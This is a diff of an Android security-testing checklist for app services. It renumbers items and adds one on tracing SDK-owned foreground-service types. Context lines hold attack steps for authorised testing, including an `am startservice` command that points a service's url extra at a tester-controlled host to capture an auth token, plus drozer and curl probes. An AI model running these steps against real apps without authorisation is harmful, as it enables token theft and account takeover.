@@ -62,7 +62,8 @@ transaction actually arrives on — or does it only validate *what* is being ask
 6. **Started-service entry points (`onStartCommand`).** Cheap to test with `am startservice`, routinely
    forgotten because the reviewer went straight to the AIDL surface.
 7. **Foreground-service types.** `camera`/`microphone`/`location` reachable from an exported entry point
-   is a privacy Critical; the Android 14/15 restriction work is where apps grew ugly fallbacks.
+   is a privacy Critical; the Android 14/15 restriction work is where apps grew ugly fallbacks. Attribute
+   each declared type to its owning namespace while you are there — an SDK-owned one is its own finding.
 8. **Privileged listener services.** Rarely reviewed, so the novelty rate is high — but the attacker
    model is AM-04 for most of them, so rate one step down and say so.
 9. **Transport-level (oneway, transaction buffer, threadpool races, parcel mismatch).** Highest effort,
@@ -457,7 +458,7 @@ assert rows == hi - lo + 1, "loop ate results"
 - **Escalation:** Once the oracle says "no check", build the real parcel (D06-012) and reach the data.
 - **Ruled out when:** Every probed code returns `SecurityException`, or returns a `Parcel` whose exception
   originates in `Stub.onTransact` argument unmarshalling rather than in the service method — read
-  D06-078 before you call that a bypass.
+  D06-075 (the layer-ordering trap) before you call that a bypass.
 
 ### D06-012 · Raw `IBinder.transact()` bypasses hidden-API restrictions entirely
 
@@ -607,11 +608,12 @@ Log.i("POC", "getToken -> " + svc.getToken());
 
 - **Test:** `Binder.getCallingUid()` is only meaningful while the current thread is executing an incoming
   transaction. Code that caches the identity into a field, hops to a `Handler`/`Executor`/coroutine
-  dispatcher, or is also reachable in-process, silently authorises everything — the call returns
-  `Process.myUid()` and every comparison passes. This is a check most Android checklists omit entirely.
+  dispatcher, unparcels an `AttributionSource` outside the transaction thread, or is also reachable
+  in-process, silently authorises everything — the call returns `Process.myUid()` and every comparison
+  passes. This is a check most Android checklists omit entirely.
 - **How:**
 ```bash
-grep -rnE 'getCallingUid|getCallingPid|clearCallingIdentity|restoreCallingIdentity' out/sources/ -A8
+grep -rnE 'getCallingUid|getCallingPid|clearCallingIdentity|restoreCallingIdentity|AttributionSource' out/sources/ -A8
 # flag any getCallingUid() reached from a Runnable/Handler/post/Executor/launch{}, or stored to a field
 grep -rnE 'getCallingUid\(\)' out/sources/ -B12 | grep -nE 'post\(|Handler|Executor|submit\(|launch\s*\{|async\s*\{|this\.[A-Za-z]+ = .*getCallingUid'
 grep -rnE 'getCallingUid\(\)\s*==\s*(android\.os\.)?Process\.myUid' out/sources/
@@ -808,7 +810,7 @@ grep -rnE 'Binder\.getCallingUid\(\)|checkCallingPermission|enforceCallingPermis
   Exploit shape: bind, then fork-and-exit repeatedly to recycle PIDs while the service resolves the
   context. Instrument both sides so you can count wins.
 - **Proof:** The service performing the privileged action for a caller that should have been rejected —
-  report it as "won N of M attempts", not as a single success (see D06-068 for the sampling rule).
+  report it as "won N of M attempts", not as a single success (see D06-069 for the sampling rule).
 - **Escalation:** Service replacement → every client of that service now talks to you.
 - **Ruled out when:** No PID-derived value participates in an authorisation decision; PIDs used only for
   logging are fine and should be recorded as such.
@@ -962,7 +964,7 @@ drozer> run app.service.start --component com.target.app com.target.app.SyncServ
 - **Proof:** The privileged side effect observable **outside** the app — in the Samsung case, the reply
   appearing in the victim's Sent folder and arriving in the attacker's inbox. For your target: an outbound
   request at your collaborator, a file written, a local record deleted. Re-prove from the PoC app, not
-  from `adb` (D06-079).
+  from `adb` (D06-080).
 - **Escalation:** → D14/D20 (endpoint repoint and exfiltration); guessable object identifiers inside the
   service (incrementing message ids, as in EDB 38558) turn one leak into bulk enumeration → D15 IDOR.
 - **Ruled out when:** `onStartCommand` ignores the Intent entirely (returns before reading extras), or
@@ -992,7 +994,7 @@ adb shell am startservice -n com.target.app/.FetchService --es url "http://<your
   header, captured in full with the request line and headers. Leave the trace id and JSON key names
   visible; redact the token's value in the report body but keep the unredacted original for triage.
 - **Escalation:** Token → D15 IDOR/BOLA at full account privilege → account takeover. Also check whether
-  the endpoint the service calls is an **older API version** than the web app uses (D06-080).
+  the endpoint the service calls is an **older API version** than the web app uses (D06-081).
 - **Ruled out when:** The URL is not caller-controllable (constructed from a compile-time constant or an
   allow-list of hosts validated with a proper host comparison, not `startsWith`/`contains`), or the client
   used for that request has no auth interceptor — prove the second by capturing the outbound request with
@@ -1217,7 +1219,7 @@ for (int what = 0; what <= 64; what++) {
   a transferable handle.
 - **Ruled out when:** The service replies only to a `Messenger` it obtained from a trusted source (not from
   the incoming `Message`), or the replies carry no data the caller did not supply — demonstrate with the
-  body-diff rule (D06-077), not with a status impression.
+  body-diff rule (D06-078), not with a status impression.
 
 ### D06-035 · Exported entry point that starts a `camera` / `microphone` / `location` foreground service
 
@@ -1388,7 +1390,54 @@ adb shell dumpsys window | grep -i 'mCurrentFocus'   # prove nothing of the app 
   (`ForegroundServiceStartNotAllowedException` in logcat) on the API level under test, or the reachable
   entry point cannot request a while-in-use type.
 
-### D06-041 · Implicit `Intent` used to start or bind a service — the attacker answers
+### D06-041 · Attribute every declared `foregroundServiceType` — and every service — to its owning package namespace
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `broken_access_control.privilege_escalation` (null) — a third party holds a sensitive background capability inside the app's UID |
+| **Attacker** | AM-08 (malicious or compromised third-party SDK); AM-03 once an exported entry point can start that service |
+| **Applies to** | targetSdk 34+ for the mandatory type declaration; all targetSdk for the service-ownership question |
+| **Maps to** | `develop/background-work/services/fgs/service-types` (the full type ↔ permission table: `camera`/`FOREGROUND_SERVICE_CAMERA`, `microphone`/`FOREGROUND_SERVICE_MICROPHONE`, `location`, `health`, `mediaProjection`, `connectedDevice`, `dataSync`, `mediaProcessing`, `remoteMessaging`, `shortService`, `specialUse`, `systemExempted`); `about/versions/13/behavior-changes-13` (SDK-declared permissions auto-merge into the app manifest); MASWE-0018 |
+
+- **Test:** Services *and* their foreground-service types arrive by manifest merge from AARs, so the
+  declared capability set is larger than anything in the app's own source tree. Attribute each declared
+  type to the class that declares it. A `dataSync`, `connectedDevice`, `location`, `camera` or
+  `microphone` type on a service whose class sits in a **third-party namespace** means that SDK holds a
+  persistent background capability running as the app's UID, under the app's granted runtime permissions
+  — a capability the app's own team frequently cannot name when asked.
+- **How:**
+```bash
+python3 - <<'PY2'
+import xml.etree.ElementTree as ET
+A='{http://schemas.android.com/apk/res/android}'
+OWN='com.target.app'
+app=ET.parse('base_apktool/AndroidManifest.xml').getroot().find('application')
+rows=0
+for e in app.findall('service'):
+    n=e.get(A+'name') or '?'; t=e.get(A+'foregroundServiceType')
+    if t:
+        print(('FIRST-PARTY ' if n.startswith(OWN) else 'THIRD-PARTY '), t, n); rows+=1
+print('# typed services =', rows)
+PY2
+grep -nE 'FOREGROUND_SERVICE_(CAMERA|MICROPHONE|LOCATION|CONNECTED_DEVICE|DATA_SYNC|MEDIA_PROJECTION)' base_apktool/AndroidManifest.xml
+# attribute it to the dependency when you have the build tree
+grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt | grep -i foregroundservice
+# and confirm it actually runs with that type in a normal session
+adb shell dumpsys activity services com.target.app | grep -iE 'fgType|foregroundServiceType|isForeground'
+```
+- **Proof:** A `foregroundServiceType` on a service in a third-party package namespace, plus
+  `dumpsys activity services` showing that service running foreground with that type during ordinary app
+  use — and, where the build tree is available, the merger report naming the responsible AAR.
+- **Escalation:** Cross this table with D06-035: if any exported entry point can start that SDK's service,
+  an unprivileged app triggers sensor capture inside third-party code running as the victim app. → D18 for
+  the SDK's own configuration, D20 for the collection and the data-safety declaration.
+- **Ruled out when:** Every declared type belongs to a first-party service whose stated purpose matches
+  the type, and no third-party namespace declares one — evidenced by the attribution table with every row
+  assigned to a named owner. "No SDK services" is only a true negative when the table was built from the
+  **merged** manifest (D06-001), not from `app/src/main/AndroidManifest.xml`.
+
+### D06-042 · Implicit `Intent` used to start or bind a service — the attacker answers
 
 | | |
 |---|---|
@@ -1419,7 +1468,7 @@ grep -rn -B3 'startService(\|bindService(\|startForegroundService(' out/sources/
   `Intent(action)` later given `setPackage()` is explicit enough for delivery but still resolves within
   that package only; say which form you found.
 
-### D06-042 · The app binds a peer resolved by package name, with no signature check on the connection
+### D06-043 · The app binds a peer resolved by package name, with no signature check on the connection
 
 | | |
 |---|---|
@@ -1448,7 +1497,7 @@ grep -rnE 'hasSigningCertificate|checkSignatures|GET_SIGNING_CERTIFICATES' out/s
   returning `SIGNATURE_MATCH`) for the peer package **before** using the returned binder, and handles the
   negative by disconnecting.
 
-### D06-043 · `BIND_ALLOW_ACTIVITY_STARTS` handed to a third-party service
+### D06-044 · `BIND_ALLOW_ACTIVITY_STARTS` handed to a third-party service
 
 | | |
 |---|---|
@@ -1468,13 +1517,13 @@ grep -rn 'BIND_ALLOW_ACTIVITY_STARTS' out/sources/ -B8 -A4
 grep -rn 'bindService(' out/sources/ | grep -v getPackageName   # correlate the bound component
 ```
 - **Proof:** The flag used on a `bindService` whose Intent targets a package the app does not control
-  (cross-check the `<queries>` list from D06-042), then your peer service launching an activity while the
+  (cross-check the `<queries>` list from D06-043), then your peer service launching an activity while the
   victim app is backgrounded — captured on video plus `dumpsys activity activities`.
 - **Escalation:** → D04 (overlay/task-hijack phishing with the victim's foreground privilege).
 - **Ruled out when:** The flag is used only on binds to the app's own package (`setPackage(getPackageName())`
   or an explicit component in the same APK).
 
-### D06-044 · gRPC-over-binder — the `SecurityPolicy` is the caller check, not the manifest
+### D06-045 · gRPC-over-binder — the `SecurityPolicy` is the caller check, not the manifest
 
 | | |
 |---|---|
@@ -1509,7 +1558,7 @@ grep -rn 'getSecurityPolicy\|Provider<.*SecurityPolicy>\|@Provides.*SecurityPoli
   check, denies by default on an empty list, and you have followed the DI provider to the concrete object
   rather than reading an interface.
 
-### D06-045 · Privileged listener service declared **without** its `BIND_*` permission
+### D06-046 · Privileged listener service declared **without** its `BIND_*` permission
 
 | | |
 |---|---|
@@ -1552,7 +1601,7 @@ grep -rnE 'Binder\.getCallingUid|getCallingPackage|getPackagesForUid|checkCallin
   system caller it never verifies, which matters the moment the app is also installed on an OEM build
   where that permission is held by more than `system_server`.
 
-### D06-046 · The app's own `AccessibilityService`, and the app's exposure to someone else's
+### D06-047 · The app's own `AccessibilityService`, and the app's exposure to someone else's
 
 | | |
 |---|---|
@@ -1563,7 +1612,7 @@ grep -rnE 'Binder\.getCallingUid|getCallingPackage|getPackagesForUid|checkCallin
 | **Maps to** | `guide/topics/ui/accessibility/service` (`canRetrieveWindowContent`, `canPerformGestures`, `dispatchGesture`, `AccessibilityNodeInfo.performAction`); `privacy-and-security/risks/tapjacking`; ATT&CK T1513 (Screen Capture), T1516 (Input Injection), T1663 (Remote Access Software); MASWE-0039 |
 
 - **Test:** Two directions. (a) If the *target* ships an `AccessibilityService`, check the declaration and
-  the bind permission (D06-045) and read what its callbacks do with events it is handed. (b) The
+  the bind permission (D06-046) and read what its callbacks do with events it is handed. (b) The
   higher-value direction for a banking or payments app: the target's **missing mitigations** against a
   third-party accessibility service — no `FLAG_SECURE` on sensitive screens, no `accessibilityDataSensitive`,
   no `filterTouchesWhenObscured`. Scope this honestly: the user must enable your service, so the finding
@@ -1588,7 +1637,7 @@ AccessibilityNodeInfo root = getRootInActiveWindow();
   transaction-authorising controls set `filterTouchesWhenObscured` and the app runs on Android 16+ where
   `accessibilityDataSensitive` is honoured. Prove it by running the dump and getting empty text.
 
-### D06-047 · `NotificationListenerService` as an OTP and `PendingIntent` siphon
+### D06-048 · `NotificationListenerService` as an OTP and `PendingIntent` siphon
 
 | | |
 |---|---|
@@ -1622,7 +1671,7 @@ public void onNotificationPosted(StatusBarNotification sbn) {
   `EXTRA_BIG_TEXT` and the channel's `lockscreenVisibility`) **and** every notification `PendingIntent`
   carries `FLAG_IMMUTABLE` plus `FLAG_ONE_SHOT`.
 
-### D06-048 · Sensitive fields not excluded from the Autofill `AssistStructure`
+### D06-049 · Sensitive fields not excluded from the Autofill `AssistStructure`
 
 | | |
 |---|---|
@@ -1644,11 +1693,11 @@ adb shell uiautomator dump /sdcard/ui.xml && adb pull /sdcard/ui.xml && grep -o 
 ```
 - **Proof:** The sensitive value present in the dumped hierarchy of the screen that displays it, with the
   screen name recorded.
-- **Escalation:** → D20; combine with D06-046 when the same screens also lack `FLAG_SECURE`.
+- **Escalation:** → D20; combine with D06-047 when the same screens also lack `FLAG_SECURE`.
 - **Ruled out when:** The sensitive views set `importantForAutofill="no"` or `noExcludeDescendants`, or the
   screen sets `FLAG_SECURE` — demonstrate with an empty `uiautomator dump` for that screen.
 
-### D06-049 · `TileService` action performed while the device is locked
+### D06-050 · `TileService` action performed while the device is locked
 
 | | |
 |---|---|
@@ -1673,12 +1722,12 @@ adb shell uiautomator dump /sdcard/lock.xml && adb pull /sdcard/lock.xml
 - **Proof:** The action completing, or the launched activity rendering its content, with the keyguard still
   displayed. The `uiautomator dump` taken while locked, showing the app's own view hierarchy, is the
   screenshot-independent artefact.
-- **Escalation:** Pairs with the home-screen widget surface (D06-051) for a lock-screen-only disclosure
+- **Escalation:** Pairs with the home-screen widget surface (D06-052) for a lock-screen-only disclosure
   chain; → D13 step-up-authentication finding.
 - **Ruled out when:** `onClick()` calls `isLocked()`/`isSecure()` and routes the action through
   `unlockAndRun()`, verified by tapping while locked and seeing the keyguard challenge.
 
-### D06-050 · Exported `SliceProvider` whose `onBindSlice` acts on the URI
+### D06-051 · Exported `SliceProvider` whose `onBindSlice` acts on the URI
 
 | | |
 |---|---|
@@ -1706,7 +1755,7 @@ adb shell content query --uri 'content://com.target.app/hello'
 - **Ruled out when:** `onBindSlice` is a pure function of already-public state and calls
   `checkSlicePermission()` before returning anything account-scoped.
 
-### D06-051 · `AppWidgetProvider` accepts a forged `APPWIDGET_UPDATE` or custom action
+### D06-052 · `AppWidgetProvider` accepts a forged `APPWIDGET_UPDATE` or custom action
 
 | | |
 |---|---|
@@ -1735,7 +1784,7 @@ adb shell dumpsys appwidget | grep -A10 com.target.app
 - **Ruled out when:** `onReceive` handles only the framework actions and ignores extras it did not set, or
   every custom action is guarded by a `signature`-level permission on the `<receiver>`.
 
-### D06-052 · `MediaBrowserService` with no `onGetRoot` package validation
+### D06-053 · `MediaBrowserService` with no `onGetRoot` package validation
 
 | | |
 |---|---|
@@ -1779,7 +1828,7 @@ mb.connect();
   validated against a signature-checked allow-list (the `PackageValidator` pattern) — demonstrate by
   connecting from an unrelated package and seeing the connection refused.
 
-### D06-053 · `CarAppService` shipped with `ALLOW_ALL_HOSTS_VALIDATOR`
+### D06-054 · `CarAppService` shipped with `ALLOW_ALL_HOSTS_VALIDATOR`
 
 | | |
 |---|---|
@@ -1811,7 +1860,7 @@ bindService(i, conn, Context.BIND_AUTO_CREATE);
   host package names **with** their signing certificates, and the bind from an unrelated package is
   rejected.
 
-### D06-054 · `WearableListenerService` path routing with no node or capability verification
+### D06-055 · `WearableListenerService` path routing with no node or capability verification
 
 | | |
 |---|---|
@@ -1840,7 +1889,7 @@ grep -rnE 'onMessageReceived|onDataChanged|getSourceNodeId|getPath\(\)|Capabilit
 - **Ruled out when:** Every handler compares `getSourceNodeId()` against a node obtained from
   `CapabilityClient` for the app's own capability, and rejects unknown nodes.
 
-### D06-055 · `ChooserTargetService` — LEGACY, but still shipping in old code
+### D06-056 · `ChooserTargetService` — LEGACY, but still shipping in old code
 
 | | |
 |---|---|
@@ -1869,7 +1918,7 @@ grep -rnE 'extends ChooserTargetService|onGetChooserTargets|new ChooserTarget\('
   shortcuts), or it declares `android:permission="android.permission.BIND_CHOOSER_TARGET_SERVICE"` and
   returns only non-account-scoped targets.
 
-### D06-056 · `androidx.startup.InitializationProvider` — the pre-authentication code path nobody wrote
+### D06-057 · `androidx.startup.InitializationProvider` — the pre-authentication code path nobody wrote
 
 | | |
 |---|---|
@@ -1906,7 +1955,7 @@ adb shell dumpsys package providers | grep androidx-startup
   reading the bodies; and the collision experiment returns "install succeeded", which refutes the
   hypothesis on that build.
 
-### D06-057 · `JobService` missing `BIND_JOB_SERVICE`
+### D06-058 · `JobService` missing `BIND_JOB_SERVICE`
 
 | | |
 |---|---|
@@ -1928,11 +1977,11 @@ adb shell dumpsys jobscheduler | grep -A15 com.target.app
 ```
 - **Proof:** A `JobService` in the merged manifest with `exported="true"` (or an intent filter) and no
   `BIND_JOB_SERVICE`, plus your PoC binding it and the job body executing with your `JobParameters`.
-- **Escalation:** → D06-059 (the job's input data is then attacker-controlled); → D11 if the job writes.
+- **Escalation:** → D06-060 (the job's input data is then attacker-controlled); → D11 if the job writes.
 - **Ruled out when:** Every `JobService` in the merged manifest declares `BIND_JOB_SERVICE` — check the
   merged manifest, because library-contributed job services are the common miss.
 
-### D06-058 · WorkManager's persisted `WorkSpec` input and its injected components
+### D06-059 · WorkManager's persisted `WorkSpec` input and its injected components
 
 | | |
 |---|---|
@@ -1963,7 +2012,7 @@ adb shell am broadcast -n com.target.app/androidx.work.diagnostics.DiagnosticsRe
   the caller's session, and the diagnostics/reschedule receivers are `exported="false"` in the merged
   manifest.
 
-### D06-059 · `WorkManager` / `AlarmManager` job input hijack from an exported entry point
+### D06-060 · `WorkManager` / `AlarmManager` job input hijack from an exported entry point
 
 | | |
 |---|---|
@@ -1991,7 +2040,7 @@ adb shell dumpsys alarm | grep -A5 com.target.app
   `setInputData` is validated against an allow-list at scheduling time — show the validation and a
   rejected injection attempt.
 
-### D06-060 · `androidx.work.multiprocess` — `RemoteWorkerService` is a bound service with a parcel boundary
+### D06-061 · `androidx.work.multiprocess` — `RemoteWorkerService` is a bound service with a parcel boundary
 
 | | |
 |---|---|
@@ -2013,12 +2062,12 @@ grep -rln 'implements Parcelable' out/sources/ | xargs grep -ln 'catch'
 ```
 - **Proof:** The service's manifest entry showing `exported="true"` with no permission, plus a bind from a
   zero-permission app; or, for the mismatch variant, `Parcel.dataPosition()` after `createFromParcel`
-  differing from `dataSize()` in a harness (D06-065).
-- **Escalation:** → D06-065; → D17 when the enqueued worker class name is caller-controllable.
+  differing from `dataSize()` in a harness (D06-066).
+- **Escalation:** → D06-066; → D17 when the enqueued worker class name is caller-controllable.
 - **Ruled out when:** The multiprocess service is absent from the merged manifest, or declares a
   `signature`-level permission, and no app-defined `Parcelable` crosses the boundary.
 
-### D06-061 · `JobIntentService` entry points — LEGACY, and still the enqueue path in old builds
+### D06-062 · `JobIntentService` entry points — LEGACY, and still the enqueue path in old builds
 
 | | |
 |---|---|
@@ -2045,13 +2094,13 @@ adb shell am startservice -n com.target.app/.MyJobIntentService --es url https:/
 - **Ruled out when:** No `JobIntentService` subclass exists in the merged manifest, or the subclass
   declares `BIND_JOB_SERVICE` and `onHandleWork` ignores caller-supplied extras.
 
-### D06-062 · A security decision implemented as a `oneway` transaction
+### D06-063 · A security decision implemented as a `oneway` transaction
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
 | **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4) when a "revoke"/"logout" call can be dropped; `broken_access_control.privilege_escalation` (null) when the dropped call is a lock or entitlement revocation |
-| **Attacker** | AM-03 (must be able to interpose, typically via D06-041) or AM-08 |
+| **Attacker** | AM-03 (must be able to interpose, typically via D06-042) or AM-08 |
 | **Applies to** | All |
 | **Maps to** | AOSP "Binder threading" — one-way calls return immediately; ordering is guaranteed only within a single interface; the driver reserves a separate async area. `android.os.Binder.FLAG_ONEWAY`. |
 
@@ -2077,12 +2126,12 @@ Java.perform(function () {
 - **Proof:** The caller proceeding down its success path (UI shows "signed out", the log says "revoked")
   while the server-side state is unchanged — demonstrated by a subsequent authenticated request
   succeeding.
-- **Escalation:** → D13 (a session that survives logout); pair with D06-063 for a targeted denial of the
+- **Escalation:** → D13 (a session that survives logout); pair with D06-064 for a targeted denial of the
   async transaction space.
 - **Ruled out when:** Every security-relevant state change is a synchronous transaction whose return value
   the caller checks, or the state change is confirmed by a subsequent read — show the read.
 
-### D06-063 · Transaction-buffer exhaustion and a fail-open `TransactionTooLargeException` catch
+### D06-064 · Transaction-buffer exhaustion and a fail-open `TransactionTooLargeException` catch
 
 | | |
 |---|---|
@@ -2116,7 +2165,7 @@ adb logcat | grep -E 'TransactionTooLarge|!!! FAILED BINDER TRANSACTION'
 - **Ruled out when:** Every `catch (RemoteException|TransactionTooLargeException)` fails closed (returns
   the denied value or rethrows), read from the decompiled body.
 
-### D06-064 · A `ParcelFileDescriptor` returned over binder is a live FD in your process
+### D06-065 · A `ParcelFileDescriptor` returned over binder is a live FD in your process
 
 | | |
 |---|---|
@@ -2143,7 +2192,7 @@ adb shell ls -l /proc/$(adb shell pidof com.poc.attacker)/fd/
 - **Ruled out when:** Every returned FD is opened read-only on a file whose contents the caller could
   already obtain, or the method returns no FD at all — list the methods you checked.
 
-### D06-065 · The app's own `Parcelable` has a `writeToParcel`/`createFromParcel` mismatch
+### D06-066 · The app's own `Parcelable` has a `writeToParcel`/`createFromParcel` mismatch
 
 | | |
 |---|---|
@@ -2178,11 +2227,11 @@ grep -rn 'createFromParcel' out/sources/ -A25 | grep -nE 'catch\s*\(|readList\(|
   `createFromParcel` swallows an exception, and untyped `readParcelable`/`getParcelable` calls are replaced
   with the class-constrained forms.
 
-### D06-066 · `isolatedProcess` — a real containment boundary, in both directions
+### D06-067 · `isolatedProcess` — a real containment boundary, in both directions
 
 | | |
 |---|---|
-| **Severity ceiling** | Medium standalone; it is the **amplifier** for a D16 finding |
+| **Severity ceiling** | Medium — standalone; it is the amplifier for a D16 memory-safety finding |
 | **VRT** | n/a standalone — it modifies the rating of a memory-safety finding |
 | **Attacker** | n/a |
 | **Applies to** | Android 4.1+ |
@@ -2207,11 +2256,11 @@ adb shell ps -AZ | grep -E 'isolated_app|com.target.app'
 - **Ruled out when:** `ps -AZ` shows the parser in `isolated_app` while it handles the untrusted input —
   record the SELinux context string in the ruled-out register.
 
-### D06-067 · Binder domains and vendor interfaces are not app-reachable — the false-positive gate
+### D06-068 · Binder domains and vendor interfaces are not app-reachable — the false-positive gate
 
 | | |
 |---|---|
-| **Severity ceiling** | Support (Medium as an OEM-VRP report for the `@VintfStability` variant) |
+| **Severity ceiling** | Support — Medium as an OEM-VRP report for the `@VintfStability` variant |
 | **VRT** | n/a — this gate stops an over-rated report |
 | **Attacker** | n/a |
 | **Applies to** | Android 8+ (multiple binder contexts, introduced with Treble); the AIDL-HAL variant is Android 11+ and OEM/vendor images only |
@@ -2240,7 +2289,7 @@ adb shell cat /vendor/etc/vintf/manifest.xml | grep -A4 '<hal format="aidl"'
 - **Ruled out when:** `service list` contains no framework proxy for the HAL, or `getService()` returns
   null from an app UID — this is the mechanism, and it is the whole point of the item.
 
-### D06-068 · Binder threadpool re-entrancy — check-then-act races, proved statistically
+### D06-069 · Binder threadpool re-entrancy — check-then-act races, proved statistically
 
 | | |
 |---|---|
@@ -2271,7 +2320,7 @@ for (int i = 0; i < 5000; i++) { final int k = i; ex.submit(() -> svc.redeem(k %
   database unique constraint), and 100+ concurrent attempts produce exactly one grant — state the attempt
   count in the ruled-out register.
 
-### D06-069 · Local socket or localhost HTTP server bound by the app without authentication
+### D06-070 · Local socket or localhost HTTP server bound by the app without authentication
 
 | | |
 |---|---|
@@ -2301,11 +2350,11 @@ grep -rnE 'new ServerSocket\(|LocalServerSocket\(|NanoHTTPD|ktor|embeddedServer|
   request requires a token the app generated at runtime and never wrote to a world-readable location —
   prove by connecting without the token and getting a rejection whose body differs from the success body.
 
-### D06-070 · Shell-backed binder brokers (Shizuku-class) as an assumed-privilege path
+### D06-071 · Shell-backed binder brokers (Shizuku-class) as an assumed-privilege path
 
 | | |
 |---|---|
-| **Severity ceiling** | High (as a fleet/MDM finding); as an app finding, when the app exposes such a broker or trusts state a broker can forge |
+| **Severity ceiling** | High — as a fleet/MDM finding; as an app finding, only when the app itself exposes such a broker or trusts state a broker can forge |
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-04 (the user completes the pairing flow) |
 | **Applies to** | Android 11+ (wireless debugging pairing). Boundaries still apply: shell cannot read `/data/user/0/<pkg>`, and shell permissions are trimmed by release and by OEM. |
@@ -2334,7 +2383,7 @@ cmd connectivity set-package-networking-enabled false com.example.agent
   shell-UID process can set (AppOps, secure settings, package-networking state) — name the decisions you
   checked.
 
-### D06-071 · Service acting as a network proxy or registering a `VpnService`
+### D06-072 · Service acting as a network proxy or registering a `VpnService`
 
 | | |
 |---|---|
@@ -2362,7 +2411,7 @@ adb shell dumpsys connectivity | grep -i vpn
 - **Ruled out when:** No socket is in LISTEN state on a non-loopback address for the app's UID, and no
   `VpnService` is declared — attach the `/proc/net/tcp` capture as the negative's evidence.
 
-### D06-072 · Remote-support / screen-share module embedded as a service
+### D06-073 · Remote-support / screen-share module embedded as a service
 
 | | |
 |---|---|
@@ -2390,7 +2439,7 @@ adb shell dumpsys media_projection
 - **Ruled out when:** Every session requires a fresh, user-visible consent (the `MediaProjection` dialog
   plus an in-app confirmation) and the session code has adequate entropy — measure it, do not eyeball it.
 
-### D06-073 · Cast / remote-playback session as an unauthenticated control and content channel
+### D06-074 · Cast / remote-playback session as an unauthenticated control and content channel
 
 | | |
 |---|---|
@@ -2418,7 +2467,7 @@ tshark -r cast.pcap -Y 'mdns || tcp.port==8009' -T fields -e _ws.col.Info
 - **Ruled out when:** The cast payload carries only short-lived, single-use, device-bound URLs — replay
   one from another host and show it rejected.
 
-### D06-074 · THE LAYER-ORDERING TRAP, binder edition — an argument error does not prove you passed the caller check
+### D06-075 · THE LAYER-ORDERING TRAP, binder edition — an argument error does not prove you passed the caller check
 
 | | |
 |---|---|
@@ -2457,7 +2506,7 @@ curl -s -X POST https://target/api/v1/resource -H 'Content-Type: application/jso
 - **Ruled out when:** The exception frame is inside the service method (or the well-formed `{}` still
   returns the domain error) — then the bypass claim stands and you proceed.
 
-### D06-075 · Shadow API — the bound service is a bridge to an older backend version
+### D06-076 · Shadow API — the bound service is a bridge to an older backend version
 
 | | |
 |---|---|
@@ -2493,7 +2542,7 @@ curl -s -H "Accept: application/vnd.company.v1+json" "https://$TARGET/api/users"
 - **Ruled out when:** Every app-derived endpoint behaves identically to the current web API on all four
   axes, tested with the same request and the same account — record the four comparisons.
 
-### D06-076 · Confirm the SELinux domain before claiming an escalation `untrusted_app` cannot perform
+### D06-077 · Confirm the SELinux domain before claiming an escalation `untrusted_app` cannot perform
 
 | | |
 |---|---|
@@ -2521,7 +2570,7 @@ adb logcat -b all | grep 'avc: '
 - **Ruled out when:** The claimed step produced no AVC denial and returned the data, recorded with the
   `dmesg` capture taken during the PoC run.
 
-### D06-077 · Marker discipline and the body-diff rule for binder returns
+### D06-078 · Marker discipline and the body-diff rule for binder returns
 
 | | |
 |---|---|
@@ -2557,7 +2606,7 @@ diff <(xxd unprivileged-return.bin) <(xxd legitimate-return.bin)
 - **Ruled out when:** The marker appears in the baseline (word collision — the claim dies), or the
   privileged and unprivileged returns are byte-identical.
 
-### D06-078 · Evidence hygiene for a service-driven state change
+### D06-079 · Evidence hygiene for a service-driven state change
 
 | | |
 |---|---|
@@ -2593,7 +2642,7 @@ grep -iE 'authorization|"token"|set-cookie' evidence/raw.sanitised.txt | head   
 - **Escalation:** n/a.
 - **Ruled out when:** n/a — this is a deliverable standard, not a test.
 
-### D06-079 · `adb shell` is UID 2000 — re-prove every candidate from a zero-permission app
+### D06-080 · `adb shell` is UID 2000 — re-prove every candidate from a zero-permission app
 
 | | |
 |---|---|
@@ -2629,7 +2678,7 @@ adb shell am start -n com.poc.attacker/.Main
   negative and must be recorded as one, naming the permission or platform gate that `shell` held and the
   app did not.
 
-### D06-080 · Severity governance and chain-filing order for binder findings
+### D06-081 · Severity governance and chain-filing order for binder findings
 
 | | |
 |---|---|
@@ -2683,15 +2732,15 @@ These primitives have independent fix surfaces and are filed separately per the 
 | "Service X is exported" | An inventory item, not a finding. The entire mobile branch of the VRT is P5 and this is not even in it. Google's own invalid-report guidance says the export is only a finding if it "can be used to gain unauthorized access to application data or functionality". | Reach a privileged action, another user's data, or a non-exported component through it, from a zero-permission PoC app. |
 | "`onServiceConnected` fired, so I can bind" — especially on a gRPC-over-binder service | `onBind` succeeds regardless of the `SecurityPolicy`, which rejects at the RPC layer. A successful bind proves reachability, not authorisation. | Complete an RPC and show what it returned, or quote a `permitAll()` / package-name-only policy body. |
 | A `SecurityException` on one AIDL method | Proves that one method is gated. Interfaces are asymmetric by default. | Test every method in the table from D06-007 and report the ones with no check. |
-| Crash from a malformed parcel or a huge `byte[]` | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5**. | Turn it into memory corruption with a demonstrated primitive (→ D16), or show the exception handler fails open (D06-063). |
+| Crash from a malformed parcel or a huge `byte[]` | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5**. | Turn it into memory corruption with a demonstrated primitive (→ D16), or show the exception handler fails open (D06-064). |
 | A `NullPointerException` returned from `service call` | It proves the method body executed — an oracle, not an impact. On its own it is a probe result. | Build the real parcel and return the data (D06-012), or show the method performs a privileged action. |
 | Token or secret found in the WorkManager `WorkSpec` database | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` is **P5**; the UID sandbox already protects it and you read it with root or `run-as`. | Show a zero-permission app reaching it — through an exported upload service (D06-029), a provider (D07), or a backup (D11). The reach is the finding. |
 | "The app runs a service in a separate `:remote` process" | A design choice, and usually a *good* one. | The interface that process serves is unguarded (D06-015). |
 | "`isolatedProcess` is not set on service Y" | Hardening only. No boundary is crossed. | Pair it with a memory-safety finding in the parser that runs there (→ D16); the absence is the severity amplifier, not the bug. |
